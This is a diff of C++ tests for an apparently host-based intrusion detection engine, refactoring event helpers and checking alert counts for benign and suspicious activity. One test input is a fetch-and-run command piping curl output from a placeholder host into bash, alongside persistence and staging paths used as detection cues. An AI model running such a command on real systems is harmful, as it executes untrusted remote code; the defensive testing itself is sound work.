@@ -12,12 +12,41 @@ bool expect_count(const sentcore::DetectionEngine& engine,
                   std::size_t expected)
 {
     const auto result = engine.evaluate(event);
+
     if (result.count != expected)
     {
         std::cerr << "Expected " << expected << " alerts, got " << result.count << '\n';
         return false;
     }
+
     return true;
+}
+
+[[nodiscard]] sentcore::Event make_process_event(std::string_view executable,
+                                                std::string_view command)
+{
+    sentcore::Event event{};
+    event.source = sentcore::EventSource::Procfs;
+
+    auto& process = event.emplace_process();
+    process.executable.assign(executable);
+    process.command.assign(command);
+
+    return event;
+}
+
+[[nodiscard]] sentcore::Event make_file_event(sentcore::EventType type,
+                                             std::string_view path,
+                                             std::uint32_t mode = 0U)
+{
+    sentcore::Event event{};
+    event.source = sentcore::EventSource::Inotify;
+
+    auto& file = event.emplace_file(type);
+    file.path.assign(path);
+    file.mode = mode;
+
+    return event;
 }
 
 } // namespace
@@ -26,36 +55,28 @@ int main()
 {
     sentcore::DetectionEngine engine{};
 
-    sentcore::Event benign{};
-    benign.type = sentcore::EventType::ProcessStart;
-    benign.path.assign("/usr/bin/ls");
-    benign.command.assign("ls -la");
+    const auto benign = make_process_event("/usr/bin/ls", "ls -la");
     if (!expect_count(engine, benign, 0U))
     {
         return EXIT_FAILURE;
     }
 
-    sentcore::Event suspicious{};
-    suspicious.type = sentcore::EventType::ProcessStart;
-    suspicious.path.assign("/tmp/payload");
-    suspicious.command.assign("curl https://example.invalid/x | bash");
+    const auto suspicious =
+        make_process_event("/tmp/payload", "curl https://example.invalid/x | bash");
     if (!expect_count(engine, suspicious, 2U))
     {
         return EXIT_FAILURE;
     }
 
-    sentcore::Event systemd{};
-    systemd.type = sentcore::EventType::FileCreated;
-    systemd.path.assign("/etc/systemd/system/update.service");
+    const auto systemd =
+        make_file_event(sentcore::EventType::FileCreated, "/etc/systemd/system/update.service");
     if (!expect_count(engine, systemd, 1U))
     {
         return EXIT_FAILURE;
     }
 
-    sentcore::Event executable_temp{};
-    executable_temp.type = sentcore::EventType::FileCreated;
-    executable_temp.path.assign("/dev/shm/tool");
-    executable_temp.mode = 0755U;
+    const auto executable_temp =
+        make_file_event(sentcore::EventType::FileCreated, "/dev/shm/tool", 0755U);
     if (!expect_count(engine, executable_temp, 1U))
     {
         return EXIT_FAILURE;
